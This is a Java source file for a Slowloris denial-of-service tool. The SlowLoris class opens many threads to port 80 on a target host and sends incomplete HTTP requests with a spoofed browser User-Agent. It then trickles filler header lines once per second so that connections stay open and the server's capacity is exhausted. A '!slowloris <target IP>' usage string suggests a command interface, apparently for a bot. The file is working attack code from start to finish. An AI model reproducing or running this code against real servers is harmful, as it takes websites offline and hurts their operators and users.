import java.io.PrintWriter;
import java.net.Socket;


public class SlowLoris extends HostnameResolver
{

    private String host;
    private int threads;
    private int resend;

    public SlowLoris(String host, int threads, int resend) throws Exception
    {
        this.host = resolve(host);
        this.threads = threads;
        this.resend = resend;
        go();
    }

    @Override
    public String resolve(String host) throws Exception
    {
        return super.resolve(host);
    }

    public static String printHelp()
    {
        return "Usage: !slowloris <target IP> <number of threads> <resends per thread>";
    }

    public void go()
    {
        for(int i = 0; i < threads; i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    try
                    {
                        Socket socket = new Socket(host, 80);
                        PrintWriter out = new PrintWriter(socket.getOutputStream());
                        out.println("GET / HTTP/1.1");
                        out.println("Host: " + host + "");
                        out.println("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
                        out.println("Content-Length: 42");
                        int iterations = 0;
                        while (true)
                        {
                            if (iterations >= resend)
                            {
                                break;
                            }
                            out.println("X-a: b"); //Dem Header weitere Daten hinzufügen
                            Thread.sleep(1000);
                            iterations ++;
                        }
                        out.close();
                        socket.close();

                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }


}
